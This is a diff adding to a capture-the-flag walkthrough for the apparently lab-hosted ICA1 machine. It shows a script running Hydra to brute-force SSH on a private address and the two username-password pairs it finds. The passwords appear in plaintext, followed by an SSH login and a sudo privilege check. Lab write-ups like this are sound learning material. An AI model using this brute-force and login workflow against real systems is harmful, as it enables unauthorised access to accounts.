@@ -312,7 +312,56 @@ Successfully installed mysql-connector-python-8.0.30 protobuf-3.20.1
 
 ```
 
+Run python script and find 2 ssh valid logins:
+```shel
+└─$ python extract_ica1_os_pass.py 
+MySQL connection is closed
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
->TO BE CONTINUED
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-05 19:39:36
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
+[DATA] attacking ssh://192.168.1.179:22/
+[22][ssh] host: 192.168.1.179   login: dexter   password: 7ZwV4qtg42cmUXGX
+[22][ssh] host: 192.168.1.179   login: travis   password: DJceVy98W28Y7wLg
+1 of 1 target successfully completed, 2 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-05 19:39:43
+                                                                                                            
+└─$ 
 
-echo -ne 'c3VSSkFkR3dMcDhkeTNyRg==' | base64 -d -
+```
+
+Login with dexter user:
+```shell
+└─$ ssh dexter@192.168.1.179
+dexter@192.168.1.179's password: 
+Linux debian 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Aug  5 12:11:01 2022 from 192.168.1.23
+dexter@debian:~$ 
+```
+
+User with no sudo privileges:
+```shell
+dexter@debian:~$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for dexter: 
+Sorry, user dexter may not run sudo on debian.
+dexter@debian:~$ id
+uid=1001(dexter) gid=1001(dexter) groups=1001(dexter)
+dexter@debian:~$ 
+
+```
